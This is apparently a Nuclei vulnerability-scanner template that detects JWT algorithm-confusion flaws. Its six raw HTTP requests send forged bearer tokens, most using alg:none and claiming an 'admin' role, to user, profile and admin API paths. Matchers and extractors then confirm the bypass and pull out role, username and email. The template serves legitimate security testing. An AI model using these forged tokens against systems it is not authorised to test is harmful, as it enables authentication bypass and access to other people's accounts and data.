id: jwt-algorithm-confusion
info:
  name: JWT Algorithm Confusion Attack Detection
  author: geeknik
  severity: critical
  description: |
    Detects JWT implementations vulnerable to algorithm confusion attacks including
    alg:none bypass, RSA to HMAC downgrade, and key confusion vulnerabilities.
  reference:
    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
    - https://portswigger.net/web-security/jwt/algorithm-confusion
  classification:
    cwe-id: CWE-347
  tags: jwt,authentication,bypass,critical
  metadata:
    max-request: 6

variables:
  test_payload: "test_user_{{randstr}}"

requests:
  - raw:
      - |
        GET {{BaseURL}}/api/user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNjIzOTAyMiwiZXhwIjo5OTk5OTk5OTk5fQ.

      - |
        GET {{BaseURL}}/api/user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.

      - |
        GET {{BaseURL}}/api/user HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNjIzOTAyMiwiZXhwIjo5OTk5OTk5OTk5fQ.YTVmNjRhYzU2NzY4ZjQ5ZGJmNzU0ZWM0YzU1MzU0YzA3YmU5NTU0ZGJmNzU0ZWM0YzU1MzU0YzA3YmU5NTU0ZA

      - |
        GET {{BaseURL}}/api/profile HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNjIzOTAyMiwiZXhwIjo5OTk5OTk5OTk5fQ.

      - |
        GET {{BaseURL}}/api/admin HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNjIzOTAyMiwiZXhwIjo5OTk5OTk5OTk5fQ.

      - |
        GET {{BaseURL}}/api/me HTTP/1.1
        Host: {{Hostname}}
        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYxNjIzOTAyMiwiZXhwIjo5OTk5OTk5OTk5fQ.

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '"admin"'
          - '"role"'
          - '"user"'
          - '"email"'
          - '"id"'
        condition: or

      - type: word
        part: body
        words:
          - "Unauthorized"
          - "Invalid token"
          - "Authentication failed"
          - "Access denied"
        negative: true

    extractors:
      - type: regex
        part: body
        regex:
          - '"role":\s*"([^"]+)"'
          - '"username":\s*"([^"]+)"'
          - '"email":\s*"([^"]+)"'